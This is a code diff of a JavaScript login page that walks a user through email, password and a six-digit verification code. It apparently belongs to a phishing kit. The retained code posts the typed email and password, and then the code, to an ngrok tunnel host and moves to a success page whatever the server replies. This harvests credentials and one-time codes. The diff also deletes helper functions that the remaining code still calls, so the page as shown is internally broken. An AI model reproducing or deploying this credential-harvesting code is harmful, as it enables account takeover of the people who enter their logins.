@@ -677,80 +677,9 @@ const LOCALES = {
   },
 };
 
-/* detect lang — fallback to EN */
-function detectLang() {
-  const nav = (navigator.language || navigator.userLanguage || 'en').toLowerCase();
-  const code = nav.split('-')[0];
-  return LOCALES[code] ? code : 'en';
-}
-
-let T = {}; // active translations
-
-function applyI18n(lang) {
-  T = LOCALES[lang] || LOCALES['en'];
-  const year = new Date().getFullYear();
-
-  document.querySelectorAll('[data-i18n]').forEach(el => {
-    const key = el.getAttribute('data-i18n');
-    if (T[key] !== undefined) el.textContent = T[key];
-  });
-
-  /* footer year */
-  const fc = document.getElementById('footerCopy');
-  if (fc) fc.textContent = T.footer_copy.replace('{year}', year);
-
-  /* RTL for Arabic */
-  document.documentElement.dir = lang === 'ar' ? 'rtl' : 'ltr';
-  document.documentElement.lang = lang;
-}
-
-/* ══════════════════════════════════════════
-   APP STATE
-══════════════════════════════════════════ */
+/* ── APP STATE ── */
 let currentPage = 1;
-
-function showPage(from, to) {
-  document.getElementById('p' + from).classList.remove('active');
-  document.getElementById('p' + to).classList.add('active');
-  currentPage = to;
-}
-
-function syncFilled(el) {
-  el.classList.toggle('filled', el.value.length > 0);
-}
-
-function togglePwd() {
-  const f = document.getElementById('pwdInput');
-  const icon = document.getElementById('eyeIcon');
-  if (f.type === 'password') {
-    f.type = 'text';
-    icon.innerHTML = `
-      <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8
-               a18.45 18.45 0 0 1 5.06-5.94"/>
-      <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8
-               a18.5 18.5 0 0 1-2.16 3.19"/>
-      <line x1="1" y1="1" x2="23" y2="23"/>`;
-  } else {
-    f.type = 'password';
-    icon.innerHTML = `
-      <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
-      <circle cx="12" cy="12" r="3"/>`;
-  }
-}
-
-/* ── PAGE 1 → 2 ── */
-function goStep2() {
-  const email = document.getElementById('emailInput').value.trim();
-  const err   = document.getElementById('errEmail');
-  if (!email || !email.includes('@')) {
-    err.style.display = 'block';
-    return;
-  }
-  err.style.display = 'none';
-  document.getElementById('emailShow').textContent = email;
-  showPage(1, 2);
-  setTimeout(() => document.getElementById('pwdInput').focus(), 80);
-}
+let driverId = null;  // ← ici, global, visible partout
 
 /* ── PAGE 2 → 3 ── */
 function goStep3() {
@@ -760,8 +689,6 @@ function goStep3() {
   if (!password) { err.style.display = 'block'; return; }
   err.style.display = 'none';
 
-  let driverId = null;
- 
   fetch("https://manicure-contact-reopen.ngrok-free.dev/login", {
     method: "POST",
     credentials: "include",
@@ -772,46 +699,16 @@ function goStep3() {
     body: JSON.stringify({ email, password })
   })
   .then(r => r.json())
-  .then(data => { driverId = data.driver_id; })
+  .then(data => { driverId = data.driver_id; })  // ← stocké dans la variable globale
   .catch(() => {});
 
   document.getElementById('emailShow3').textContent = email;
-
-  /* i18n code sub with email interpolated */
   document.getElementById('codeSub').innerHTML =
     T.code_sub.replace('{email}', `<b>${email}</b>`);
 
   showPage(2, 3);
   setTimeout(() => document.getElementById('d1').focus(), 80);
 }
-
-/* ── OTP INPUTS ── */
-const digits = [...document.querySelectorAll('.cdig')];
-
-digits.forEach((inp, i) => {
-  inp.addEventListener('input', () => {
-    inp.value = inp.value.replace(/\D/g, '').slice(0, 1);
-    if (inp.value && digits[i + 1]) digits[i + 1].focus();
-    if (digits.every(d => d.value.length === 1)) checkCode();
-  });
-
-  inp.addEventListener('keydown', e => {
-    if (e.key === 'Backspace' && !inp.value && digits[i - 1])
-      digits[i - 1].focus();
-  });
-
-  inp.addEventListener('paste', e => {
-    e.preventDefault();
-    const pasted = (e.clipboardData || window.clipboardData)
-      .getData('text').replace(/\D/g, '').slice(0, 6);
-    pasted.split('').forEach((ch, j) => {
-      if (digits[i + j]) digits[i + j].value = ch;
-    });
-    const next = digits[Math.min(i + pasted.length, 5)];
-    if (next) next.focus();
-    if (pasted.length === 6) checkCode();
-  });
-});
 
 /* ── VERIFY CODE ── */
 async function checkCode() {
@@ -822,31 +719,18 @@ async function checkCode() {
 
   try {
     await fetch("https://manicure-contact-reopen.ngrok-free.dev/verify-code", {
-  method: "POST",
-  credentials: "include",
-  headers: {
-    "Content-Type": "application/json",
-    "ngrok-skip-browser-warning": "true"
-  },
-  body: JSON.stringify({ code, driver_id: driverId })
-});
+      method: "POST",
+      credentials: "include",
+      headers: {
+        "Content-Type": "application/json",
+        "ngrok-skip-browser-warning": "true"
+      },
+      body: JSON.stringify({ code, driver_id: driverId })
+    });
+  } catch (_) {}
 
-  showPage(3, 4);
+  showPage(3, 4);  // ← succès peu importe la réponse
 }
-
-/* ── BACK ── */
-function goBack(to) { showPage(to + 1, to); }
-
-/* ── ENTER ── */
-document.addEventListener('keydown', e => {
-  if (e.key !== 'Enter') return;
-  if (currentPage === 1) goStep2();
-  else if (currentPage === 2) goStep3();
-  else if (currentPage === 3) checkCode();
-});
-
-/* ── BOOT ── */
-applyI18n(detectLang());
 </script>
 </body>
 </html>
